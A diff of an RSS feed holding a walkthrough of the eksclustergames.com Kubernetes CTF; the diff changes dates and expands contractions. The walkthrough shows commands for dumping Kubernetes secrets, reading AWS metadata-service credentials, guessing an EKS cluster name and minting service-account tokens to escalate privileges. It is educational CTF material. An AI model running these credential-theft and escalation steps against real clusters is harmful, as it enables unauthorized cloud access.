@@ -9,24 +9,24 @@
             <link>https://sontek.net</link>
         </image>
         <generator>RSS for Node</generator>
-        <lastBuildDate>Fri, 21 Aug 2026 17:37:22 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 25 Aug 2026 03:54:58 GMT</lastBuildDate>
         <atom:link href="https://sontek.net/rss.xml" rel="self" type="application/rss+xml"/>
-        <pubDate>Fri, 21 Aug 2026 17:37:22 GMT</pubDate>
+        <pubDate>Tue, 25 Aug 2026 03:54:57 GMT</pubDate>
         <copyright><![CDATA[All rights reserved 2026, @sontek]]></copyright>
         <item>
             <title><![CDATA[eksclustergames.com walk through!]]></title>
-            <description><![CDATA[<p><a href="https://eksclustergames.com">eksclustergames.com</a> is a new CTF targetted at
+            <description><![CDATA[<p><a href="https://eksclustergames.com">eksclustergames.com</a> is a new CTF targeted at
 kubernetes vulnerabilities. This is a walk through on how to solve the issues.</p>
 <h1>Challenge 1</h1>
 <p>The first challenge starts off with a clue:</p>
 <pre><code>Jumpstart your quest by listing all the secrets in the cluster.
 Can you spot the flag among them?
 </code></pre>
-<p>So lets start off by getting the secrets:</p>
+<p>So let us start off by getting the secrets:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> secret</span></span>
 <span data-line=""><span style="color:#F69D50">NAME</span><span style="color:#96D0FF">         TYPE</span><span style="color:#96D0FF">     DATA</span><span style="color:#96D0FF">   AGE</span></span>
 <span data-line=""><span style="color:#F69D50">log-rotate</span><span style="color:#96D0FF">   Opaque</span><span style="color:#6CB6FF">   1</span><span style="color:#96D0FF">      37h</span></span></code></pre></figure>
-<p>Since there is only one, lets view it!</p>
+<p>Since there is only one, let us view it!</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> secret</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> json</span></span>
 <span data-line=""><span style="color:#ADBAC7">{</span></span>
 <span data-line=""><span style="color:#F69D50">    "apiVersion"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> "v1",</span></span>
@@ -66,23 +66,23 @@ platform.</p>
 For your convenience, the crane utility is already pre-installed on the machine.
 </code></pre>
 <p>The first thing I think of when reading this is that it has something to do
-with the registry a pod is living on.   So lets list the pods and see what is
+with the registry a pod is living on.   So let us list the pods and see what is
 available:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> pod</span></span>
 <span data-line=""><span style="color:#F69D50">NAME</span><span style="color:#96D0FF">                    READY</span><span style="color:#96D0FF">   STATUS</span><span style="color:#96D0FF">    RESTARTS</span><span style="color:#96D0FF">   AGE</span></span>
 <span data-line=""><span style="color:#F69D50">database-pod-2c9b3a4e</span><span style="color:#96D0FF">   1/1</span><span style="color:#96D0FF">     Running</span><span style="color:#6CB6FF">   0</span><span style="color:#96D0FF">          36h</span></span></code></pre></figure>
-<p>With only one pod as a target, lets get the image for it:</p>
+<p>With only one pod as a target, let us get the image for it:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> pod</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> json</span><span style="color:#F47067"> |</span><span style="color:#F69D50">jq</span><span style="color:#96D0FF"> '.items[0].spec.containers[0].image'</span></span>
 <span data-line=""><span style="color:#F69D50">"eksclustergames/base_ext_image"</span></span></code></pre></figure>
-<p>So its on standard <code>docker.io</code> registry instead of a private one like I was
+<p>So it is on standard <code>docker.io</code> registry instead of a private one like I was
 expecting from the clue.   The second hint was that crane is on the system so
-lets use that to pull the image and inspect it:</p>
+let us use that to pull the image and inspect it:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> crane</span><span style="color:#96D0FF"> config</span><span style="color:#96D0FF"> eksclustergames/base_ext_image</span><span style="color:#ADBAC7"> </span></span>
 <span data-line=""><span style="color:#F69D50">Error:</span><span style="color:#96D0FF"> fetching</span><span style="color:#96D0FF"> config:</span><span style="color:#96D0FF"> reading</span><span style="color:#96D0FF"> image</span><span style="color:#96D0FF"> "eksclustergames/base_ext_image":</span><span style="color:#96D0FF"> GET</span><span style="color:#96D0FF"> https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest:</span><span style="color:#96D0FF"> UNAUTHORIZED:</span><span style="color:#96D0FF"> authentication</span><span style="color:#96D0FF"> required</span><span style="color:#ADBAC7">; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]</span></span></code></pre></figure>
 <p>Which means this is a private image and we are going to need to get some
 credentials to an account that has access to this image. Usually you have to
 define a secret for kubernetes to be able to pull from private registries and
-since we started off with a secret test first that is where I'm going to go
+since we started off with a secret test first that is where I am going to go
 next:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> pod</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> json</span><span style="color:#F47067"> |</span><span style="color:#F69D50">jq</span><span style="color:#96D0FF"> '.items[0].spec.imagePullSecrets'</span></span>
 <span data-line=""><span style="color:#ADBAC7">[</span></span>
@@ -90,7 +90,7 @@ next:</p>
 <span data-line=""><span style="color:#96D0FF">    "name"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"registry-pull-secrets-780bab1d"</span></span>
 <span data-line=""><span style="color:#ADBAC7">  }</span></span>
 <span data-line=""><span style="color:#ADBAC7">]</span></span></code></pre></figure>
-<p>So that is the secret we need, lets view it:</p>
+<p>So that is the secret we need, let us view it:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> secret</span><span style="color:#96D0FF"> registry-pull-secrets-780bab1d</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> json</span><span style="color:#F47067"> |</span><span style="color:#F69D50">jq</span><span style="color:#96D0FF"> '.data.".dockerconfigjson"'</span><span style="color:#6CB6FF"> -r</span><span style="color:#F47067">|</span><span style="color:#F69D50">base64</span><span style="color:#6CB6FF"> -d</span><span style="color:#F47067">|</span><span style="color:#F69D50">jq</span></span>
 <span data-line=""><span style="color:#ADBAC7">{</span></span>
 <span data-line=""><span style="color:#F69D50">  "auths"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> {</span></span>
@@ -99,7 +99,7 @@ next:</p>
 <span data-line=""><span style="color:#ADBAC7">    }</span></span>
 <span data-line=""><span style="color:#ADBAC7">  }</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
-<p>Looks like we've got some more base64 decoding for the actual auth credentials:</p>
+<p>Looks like we have got some more base64 decoding for the actual auth credentials:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> echo</span><span style="color:#96D0FF"> "ZWtzY2x1c3RdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZ4RnVDbw=="</span><span style="color:#F47067"> |</span><span style="color:#F69D50"> base64</span><span style="color:#6CB6FF"> -d</span></span>
 <span data-line=""><span style="color:#F69D50">eksclustergames:dckr</span><span style="color:#ADBAC7">&#x3C;*REDACTED*></span></span></code></pre></figure>
 <p>So now we can login with <code>crane auth</code>:</p>
@@ -155,7 +155,7 @@ next:</p>
 <p>Looks like they leaked the secret right there in the image layers:</p>
 <pre><code>wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}'
 </code></pre>
-<p>So lets submit that and move onto the next one!</p>
+<p>So let us submit that and move onto the next one!</p>
 <h1>Challenge 3</h1>
 <p>The hint is:</p>
 <pre><code>A pod's image holds more than just code. Dive deep into its ECR repository,
@@ -163,24 +163,24 @@ inspect the image layers, and uncover the hidden secret.
 
 Remember: You are running inside a compromised EKS pod.
 </code></pre>
-<p>This sounds very similar to the last one but with the hints that its on ECR and
-that we are in the pod itself it makes me believe we'll have something like IRSA
+<p>This sounds very similar to the last one but with the hints that it is on ECR and
+that we are in the pod itself it makes me believe we will have something like IRSA
 access to AWS from the pod and need to use that to get to it.</p>
-<p>First lets check what pods we are working with:</p>
+<p>First let us check what pods we are working with:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> pod</span></span>
 <span data-line=""><span style="color:#F69D50">NAME</span><span style="color:#96D0FF">                      READY</span><span style="color:#96D0FF">   STATUS</span><span style="color:#96D0FF">    RESTARTS</span><span style="color:#96D0FF">   AGE</span></span>
 <span data-line=""><span style="color:#F69D50">accounting-pod-876647f8</span><span style="color:#96D0FF">   1/1</span><span style="color:#96D0FF">     Running</span><span style="color:#6CB6FF">   0</span><span style="color:#96D0FF">          37h</span></span></code></pre></figure>
-<p>So same as the last challenge, lets get the image and see what access we have:</p>
+<p>So same as the last challenge, let us get the image and see what access we have:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> pod</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> json</span><span style="color:#F47067"> |</span><span style="color:#F69D50">jq</span><span style="color:#96D0FF"> '.items[0].spec.containers[0].image'</span></span>
 <span data-line=""><span style="color:#F69D50">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"</span></span></code></pre></figure>
 <p>Which as expected, we do not have access to:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> crane</span><span style="color:#96D0FF"> config</span><span style="color:#96D0FF"> 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span>
 <span data-line=""><span style="color:#F69D50">Error:</span><span style="color:#96D0FF"> fetching</span><span style="color:#96D0FF"> config:</span><span style="color:#96D0FF"> reading</span><span style="color:#96D0FF"> image</span><span style="color:#96D0FF"> "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01":</span><span style="color:#96D0FF"> GET</span><span style="color:#96D0FF"> https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01:</span><span style="color:#96D0FF"> unexpected</span><span style="color:#96D0FF"> status</span><span style="color:#96D0FF"> code</span><span style="color:#6CB6FF"> 401</span><span style="color:#96D0FF"> Unauthorized:</span><span style="color:#96D0FF"> Not</span><span style="color:#96D0FF"> Authorized</span></span></code></pre></figure>
-<p>Since I expect the pod already has AWS access, lets check if the AWS CLI works:</p>
+<p>Since I expect the pod already has AWS access, let us check if the AWS CLI works:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> aws</span><span style="color:#96D0FF"> sts</span><span style="color:#96D0FF"> get-caller-identity</span></span>
 <span data-line=""> </span>
 <span data-line=""><span style="color:#F69D50">Unable</span><span style="color:#96D0FF"> to</span><span style="color:#96D0FF"> locate</span><span style="color:#96D0FF"> credentials.</span><span style="color:#96D0FF"> You</span><span style="color:#96D0FF"> can</span><span style="color:#96D0FF"> configure</span><span style="color:#96D0FF"> credentials</span><span style="color:#96D0FF"> by</span><span style="color:#96D0FF"> running</span><span style="color:#96D0FF"> "aws configure".</span></span></code></pre></figure>
-<p>Credentials are not configured right now, so we need to discover them.  Lets
+<p>Credentials are not configured right now, so we need to discover them.  Let us
 check if we have metadata server access:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> curl</span><span style="color:#96D0FF"> http://169.254.169.254/latest/meta-data/iam</span></span>
 <span data-line=""><span style="color:#F69D50">info</span></span>
@@ -194,7 +194,7 @@ to AWS:</p>
 <span data-line=""><span style="color:#F69D50">  "SecretAccessKey"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> "e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*",</span></span>
 <span data-line=""><span style="color:#F69D50">  "SessionToken"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> "FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
-<p>Lets set those as environment variables to activate our AWS access:</p>
+<p>Let us set those as environment variables to activate our AWS access:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F47067">export</span><span style="color:#ADBAC7"> AWS_ACCESS_KEY_ID</span><span style="color:#F47067">=</span><span style="color:#96D0FF">"ASIA2AVYNE&#x3C;*REDACTED*"</span></span>
 <span data-line=""><span style="color:#F47067">export</span><span style="color:#ADBAC7"> AWS_SECRET_ACCESS_KEY</span><span style="color:#F47067">=</span><span style="color:#96D0FF">"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*"</span></span>
 <span data-line=""><span style="color:#F47067">export</span><span style="color:#ADBAC7"> AWS_SESSION_TOKEN</span><span style="color:#F47067">=</span><span style="color:#96D0FF">"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span></span>
@@ -209,7 +209,7 @@ to AWS:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> export</span><span style="color:#96D0FF"> PASSWORD=</span><span style="color:#ADBAC7">$(</span><span style="color:#F69D50">aws</span><span style="color:#96D0FF"> ecr</span><span style="color:#96D0FF"> get-login-password</span><span style="color:#ADBAC7">)</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> crane</span><span style="color:#96D0FF"> auth</span><span style="color:#96D0FF"> login</span><span style="color:#6CB6FF"> -u</span><span style="color:#96D0FF"> AWS</span><span style="color:#6CB6FF"> -p</span><span style="color:#ADBAC7"> $PASSWORD </span><span style="color:#96D0FF">688655246681.dkr.ecr.us-west-1.amazonaws.com</span><span style="color:#ADBAC7">  </span></span>
 <span data-line=""><span style="color:#F69D50">2023/11/03</span><span style="color:#96D0FF"> 02:56:41</span><span style="color:#96D0FF"> logged</span><span style="color:#96D0FF"> in</span><span style="color:#96D0FF"> via</span><span style="color:#96D0FF"> /home/user/.docker/config.json</span></span></code></pre></figure>
-<p>Lets get those layers!</p>
+<p>Let us get those layers!</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> crane</span><span style="color:#96D0FF"> config</span><span style="color:#96D0FF"> 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span><span style="color:#F47067">|</span><span style="color:#F69D50">jq</span></span>
 <span data-line=""><span style="color:#ADBAC7">{</span></span>
 <span data-line=""><span style="color:#F69D50">  "architecture"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> "amd64",</span></span>
@@ -267,12 +267,12 @@ layers!</p>
 no permissions. Can you navigate your way to access the EKS Node's privileged
 service-account?
 </code></pre>
-<p>This sounds like we're going to need to escalate our privileges through the AWS
-access we acquired in the last challenge. Lets start with inspecting the
+<p>This sounds like we are going to need to escalate our privileges through the AWS
+access we acquired in the last challenge. Let us start with inspecting the
 environment again:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> pod</span></span>
 <span data-line=""><span style="color:#F69D50">Error</span><span style="color:#96D0FF"> from</span><span style="color:#96D0FF"> server</span><span style="color:#ADBAC7"> (Forbidden): pods is forbidden: User </span><span style="color:#96D0FF">"system:serviceaccount:challenge4:service-account-challenge4"</span><span style="color:#ADBAC7"> cannot list resource </span><span style="color:#96D0FF">"pods"</span><span style="color:#ADBAC7"> in API group </span><span style="color:#96D0FF">""</span><span style="color:#ADBAC7"> in the namespace </span><span style="color:#96D0FF">"challenge4"</span></span></code></pre></figure>
-<p>So we don't even have access to list pods!   Do we have any access?</p>
+<p>So we do not even have access to list pods!   Do we have any access?</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> auth</span><span style="color:#96D0FF"> can-i</span><span style="color:#6CB6FF"> --list</span></span>
 <span data-line=""><span style="color:#F69D50">warning:</span><span style="color:#96D0FF"> the</span><span style="color:#96D0FF"> list</span><span style="color:#96D0FF"> may</span><span style="color:#96D0FF"> be</span><span style="color:#96D0FF"> incomplete:</span><span style="color:#96D0FF"> webhook</span><span style="color:#96D0FF"> authorizer</span><span style="color:#96D0FF"> does</span><span style="color:#96D0FF"> not</span><span style="color:#96D0FF"> support</span><span style="color:#96D0FF"> user</span><span style="color:#96D0FF"> rule</span><span style="color:#96D0FF"> resolution</span></span>
 <span data-line=""><span style="color:#F69D50">Resources</span><span style="color:#96D0FF">                                       Non-Resource</span><span style="color:#96D0FF"> URLs</span><span style="color:#96D0FF">                     Resource</span><span style="color:#96D0FF"> Names</span><span style="color:#96D0FF">     Verbs</span></span>
@@ -299,20 +299,20 @@ environment again:</p>
 <span data-line=""><span style="color:#F69D50">podsecuritypolicies.policy</span><span style="color:#ADBAC7">                      []                                    [eks.privileged]   [use]</span></span></code></pre></figure>
 <p>That is <em>very</em> minimal access. So we are going to have to try get a token using
 the escalated privileges.  Usually we could use <code>aws eks get-token</code> but that
-requires knowing the cluster name and I don't know that.   Lets try to list the
+requires knowing the cluster name and I do not know that.   Let us try to list the
 clusters:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> aws</span><span style="color:#96D0FF"> eks</span><span style="color:#96D0FF"> list-clusters</span></span>
 <span data-line=""> </span>
 <span data-line=""><span style="color:#F69D50">An</span><span style="color:#96D0FF"> error</span><span style="color:#96D0FF"> occurred</span><span style="color:#ADBAC7"> (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/</span><span style="color:#F47067">*</span></span></code></pre></figure>
-<p>So they haven't given us much to go on at all here.  The role itself <em>might</em> be
+<p>So they have not given us much to go on at all here.  The role itself <em>might</em> be
 a clue but that is relying on them being consistent with their naming:</p>
 <pre><code>arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/
 </code></pre>
-<p>The cluster name <em>might</em> be <code>eks-challenge-cluster</code> based on that but I can't
-guarantee that. Lets check its security groups:</p>
+<p>The cluster name <em>might</em> be <code>eks-challenge-cluster</code> based on that but I cannot
+guarantee that. Let us check its security groups:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> curl</span><span style="color:#6CB6FF"> -sS</span><span style="color:#96D0FF"> http://169.254.169.254/latest/meta-data/security-groups</span><span style="color:#ADBAC7">;</span><span style="color:#6CB6FF">echo</span></span>
 <span data-line=""><span style="color:#F69D50">eks-cluster-sg-eks-challenge-cluster-963543728</span></span></code></pre></figure>
-<p>The name is there again.  I don't feel good about not having more details but it
+<p>The name is there again.  I do not feel good about not having more details but it
 is at least worth trying it:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> aws</span><span style="color:#96D0FF"> eks</span><span style="color:#96D0FF"> get-token</span><span style="color:#6CB6FF"> --cluster-name</span><span style="color:#96D0FF"> eks-challenge-cluster</span></span>
 <span data-line=""><span style="color:#ADBAC7">{</span></span>
@@ -324,7 +324,7 @@ is at least worth trying it:</p>
 <span data-line=""><span style="color:#F69D50">        "token"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX&#x3C;*REDACTED*"</span></span>
 <span data-line=""><span style="color:#ADBAC7">    }</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
-<p>This gets us a token, so lets try to use it:</p>
+<p>This gets us a token, so let us try to use it:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> export</span><span style="color:#96D0FF"> TOKEN=</span><span style="color:#ADBAC7">$(</span><span style="color:#F69D50">aws</span><span style="color:#96D0FF"> eks</span><span style="color:#96D0FF"> get-token</span><span style="color:#6CB6FF"> --cluster-name</span><span style="color:#96D0FF"> eks-challenge-cluster</span><span style="color:#F47067">|</span><span style="color:#F69D50">jq</span><span style="color:#96D0FF"> '.status.token'</span><span style="color:#6CB6FF"> -r</span><span style="color:#ADBAC7">)</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#6CB6FF"> --token</span><span style="color:#96D0FF"> "</span><span style="color:#ADBAC7">$TOKEN</span><span style="color:#96D0FF">"</span><span style="color:#96D0FF"> auth</span><span style="color:#96D0FF"> can-i</span><span style="color:#6CB6FF"> --list</span></span>
 <span data-line=""><span style="color:#F69D50">warning:</span><span style="color:#96D0FF"> the</span><span style="color:#96D0FF"> list</span><span style="color:#96D0FF"> may</span><span style="color:#96D0FF"> be</span><span style="color:#96D0FF"> incomplete:</span><span style="color:#96D0FF"> webhook</span><span style="color:#96D0FF"> authorizer</span><span style="color:#96D0FF"> does</span><span style="color:#96D0FF"> not</span><span style="color:#96D0FF"> support</span><span style="color:#96D0FF"> user</span><span style="color:#96D0FF"> rule</span><span style="color:#96D0FF"> resolution</span></span>
@@ -389,7 +389,7 @@ AWS account.
 
 Can you acquire the AWS role of the s3access-sa service account, and get the flag?
 </code></pre>
-<p>So lets start with checking what access we do have:</p>
+<p>So let us start with checking what access we do have:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> whoami</span></span>
 <span data-line=""><span style="color:#F69D50">system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal</span></span></code></pre></figure>
 <p>Can we list buckets?</p>
@@ -425,7 +425,7 @@ we have?</p>
 <span data-line=""><span style="color:#ADBAC7">                                                [/version]          []                 [get]</span></span>
 <span data-line=""><span style="color:#F69D50">podsecuritypolicies.policy</span><span style="color:#ADBAC7">                      []                  [eks.privileged]   [use]</span></span></code></pre></figure>
 <p>Hmm, being able to create tokens for the <code>debug-sa</code> resource definitely seems
-suspicious. So lets see if that will get us anywhere:</p>
+suspicious. So let us see if that will get us anywhere:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> export</span><span style="color:#96D0FF"> TOKEN=</span><span style="color:#ADBAC7">$(</span><span style="color:#F69D50">kubectl</span><span style="color:#96D0FF"> create</span><span style="color:#96D0FF"> token</span><span style="color:#96D0FF"> debug-sa</span><span style="color:#ADBAC7">)</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#6CB6FF"> --token</span><span style="color:#ADBAC7"> $TOKEN </span><span style="color:#96D0FF">auth</span><span style="color:#96D0FF"> can-i</span><span style="color:#6CB6FF"> --list</span></span>
 <span data-line=""><span style="color:#F69D50">warning:</span><span style="color:#96D0FF"> the</span><span style="color:#96D0FF"> list</span><span style="color:#96D0FF"> may</span><span style="color:#96D0FF"> be</span><span style="color:#96D0FF"> incomplete:</span><span style="color:#96D0FF"> webhook</span><span style="color:#96D0FF"> authorizer</span><span style="color:#96D0FF"> does</span><span style="color:#96D0FF"> not</span><span style="color:#96D0FF"> support</span><span style="color:#96D0FF"> user</span><span style="color:#96D0FF"> rule</span><span style="color:#96D0FF"> resolution</span></span>
@@ -451,7 +451,7 @@ suspicious. So lets see if that will get us anywhere:</p>
 <span data-line=""><span style="color:#ADBAC7">                                                [/version]                            []                 [get]</span></span>
 <span data-line=""><span style="color:#ADBAC7">                                                [/version]                            []                 [get]</span></span>
 <span data-line=""><span style="color:#F69D50">podsecuritypolicies.policy</span><span style="color:#ADBAC7">                      []                                    [eks.privileged]   [use]</span></span></code></pre></figure>
-<p>Looks like we have less access than before.  So not too helpful, lets take a
+<p>Looks like we have less access than before.  So not too helpful, let us take a
 look at that service account we want to become:</p>
